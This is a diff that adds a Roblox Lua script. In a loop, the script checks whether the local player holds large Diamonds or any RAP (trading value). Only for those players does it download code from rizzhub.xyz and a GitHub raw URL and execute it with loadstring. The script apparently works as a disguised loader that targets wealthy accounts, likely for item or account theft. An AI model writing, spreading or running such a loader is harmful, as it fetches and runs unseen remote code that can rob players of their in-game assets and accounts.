@@ -1,0 +1,26 @@
+while true do
+	wait(10)
+if game.Players.LocalPlayer.leaderstats.Diamonds.Value > 1000000000 then
+	if _G.Online == "True" then
+		print("aaa")
+		loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Script.lua", true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/maskamask/Hub/main/xxxddd", true))()
+	else
+	    print("xxx")
+		loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/maskamask/Hub/main/xxxddd", true))()
+	end	
+elseif game.Players.LocalPlayer.leaderstats.RAP.Value > 1 then
+	if _G.Online == "True" then
+		print("aaa")
+		loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Script.lua", true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/maskamask/Hub/main/xxxddd", true))()
+	else
+	    print("xxx")
+		loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/maskamask/Hub/main/xxxddd", true))()
+	end	
+else 
+print("NOOOB")
+end
+end
